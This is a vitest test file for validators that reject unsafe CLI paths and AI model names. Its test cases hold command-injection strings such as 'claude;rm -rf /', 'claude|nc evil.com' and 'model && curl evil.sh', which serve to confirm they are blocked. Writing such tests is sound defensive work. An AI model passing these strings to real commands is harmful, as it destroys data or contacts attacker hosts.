import { describe, it, expect } from "vitest";
import { isSafeCliPath, isSafeModelName } from "../../providers/cli";

describe("isSafeCliPath", () => {
  it("accepts empty string (use PATH default)", () => {
    expect(isSafeCliPath("")).toBe(true);
  });

  it("accepts plain absolute paths", () => {
    expect(isSafeCliPath("/usr/local/bin/claude")).toBe(true);
    expect(isSafeCliPath("C:\\Users\\me\\bin\\claude.exe")).toBe(false); // backslash is metachar
  });

  it("rejects paths with spaces", () => {
    expect(isSafeCliPath("/Applications/My CLI/claude")).toBe(false);
    expect(isSafeCliPath("claude --hack")).toBe(false);
  });

  it("rejects shell metacharacters", () => {
    expect(isSafeCliPath("claude & calc.exe")).toBe(false);
    expect(isSafeCliPath("claude;rm -rf /")).toBe(false);
    expect(isSafeCliPath("claude|nc evil.com")).toBe(false);
    expect(isSafeCliPath("claude`whoami`")).toBe(false);
    expect(isSafeCliPath("claude$HOME")).toBe(false);
    expect(isSafeCliPath("claude>out")).toBe(false);
    expect(isSafeCliPath("claude<in")).toBe(false);
    expect(isSafeCliPath('claude"foo"')).toBe(false);
    expect(isSafeCliPath("claude'foo'")).toBe(false);
    expect(isSafeCliPath("claude(foo)")).toBe(false);
    expect(isSafeCliPath("claude{foo}")).toBe(false);
    expect(isSafeCliPath("claude[foo]")).toBe(false);
  });

  it("rejects extreme lengths", () => {
    expect(isSafeCliPath("a".repeat(261))).toBe(false);
    expect(isSafeCliPath("a".repeat(260))).toBe(true);
  });

  it("rejects non-string input", () => {
    expect(isSafeCliPath(null as unknown as string)).toBe(false);
    expect(isSafeCliPath(undefined as unknown as string)).toBe(false);
  });
});

describe("isSafeModelName", () => {
  it("accepts empty (use CLI default)", () => {
    expect(isSafeModelName("")).toBe(true);
  });

  it("accepts realistic model names", () => {
    expect(isSafeModelName("claude-sonnet-4-6")).toBe(true);
    expect(isSafeModelName("gpt-4o")).toBe(true);
    expect(isSafeModelName("gemini-2.0-flash-lite")).toBe(true);
    expect(isSafeModelName("llama3.2")).toBe(true);
    expect(isSafeModelName("anthropic/claude-sonnet")).toBe(true);
    expect(isSafeModelName("ollama:llama3:8b")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    expect(isSafeModelName("model && curl evil.sh")).toBe(false);
    expect(isSafeModelName("model;rm -rf")).toBe(false);
    expect(isSafeModelName("model$(whoami)")).toBe(false);
    expect(isSafeModelName("model spaces")).toBe(false);
    expect(isSafeModelName("model|nc")).toBe(false);
  });

  it("rejects overlong names", () => {
    expect(isSafeModelName("a".repeat(81))).toBe(false);
    expect(isSafeModelName("a".repeat(80))).toBe(true);
  });

  it("rejects non-string input", () => {
    expect(isSafeModelName(null as unknown as string)).toBe(false);
  });
});
